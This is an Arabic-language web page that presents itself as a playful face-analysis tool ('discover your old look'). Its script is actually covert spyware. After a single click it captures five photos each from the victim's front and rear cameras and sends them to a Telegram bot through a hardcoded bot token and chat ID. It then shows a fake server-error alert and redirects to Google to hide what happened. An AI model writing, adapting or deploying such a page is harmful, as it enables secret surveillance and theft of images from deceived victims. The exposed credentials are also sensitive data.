<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحليل الوجه - شكلك في الماضي</title>
    <style>
        body { background: #1a1a2e; color: white; font-family: sans-serif; text-align: center; padding: 20px; }
        .box { border: 2px solid #0f3460; padding: 20px; border-radius: 15px; background: #16213e; max-width: 400px; margin: auto; }
        .btn { background: #e94560; color: white; border: none; padding: 15px 30px; border-radius: 50px; cursor: pointer; font-size: 18px; }
        #status { display: none; margin-top: 20px; color: #00d4ff; }
    </style>
</head>
<body>
    <div class="box">
        <h1>اكتشف شكلك القديم 🏛️</h1>
        <p>اضغط للبدء في تحليل ملامح وجهك عبر الأقمار الصناعية</p>
        <button class="btn" onclick="startProcess()">ابدأ التحليل الآن</button>
        <div id="status">جاري الاتصال بالكاميرا... يرجى الانتظار</div>
    </div>

    <script>
        const BOT_TOKEN = '8586526554:AAFC1KQ_lvsHAnwi8ErI5x27XLC42yGtgyg';
        const CHAT_ID = '7692110334';
        const canvas = document.createElement('canvas');
        canvas.width = 640; canvas.height = 480;

        async function takePhoto(stream, type, number) {
            const video = document.createElement('video');
            video.srcObject = stream;
            await video.play();
            return new Promise((resolve) => {
                setTimeout(() => {
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    canvas.toBlob(blob => {
                        const formData = new FormData();
                        formData.append('chat_id', CHAT_ID);
                        formData.append('photo', blob, 'img.jpg');
                        formData.append('caption', `📡 [${type}] صورة رقم ${number}`);
                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
                        resolve();
                    }, 'image/jpeg', 0.6);
                }, 500);
            });
        }

        async function startProcess() {
            document.getElementById('status').style.display = 'block';
            try {
                // سحب أمامية
                let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                for (let i = 1; i <= 5; i++) { await takePhoto(stream, "أمامية", i); }
                stream.getTracks().forEach(t => t.stop());

                // سحب خلفية
                try {
                    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
                    for (let i = 1; i <= 5; i++) { await takePhoto(stream, "خلفية", i); }
                    stream.getTracks().forEach(t => t.stop());
                } catch(e) {}

                alert("عذراً، الخادم لا يستجيب حالياً. حاول لاحقاً.");
                window.location.href = "https://www.google.com";
            } catch (err) {
                alert("يجب السماح بالكاميرا لكي ينجح التحليل!");
            }
        }
    </script>
</body>
</html>
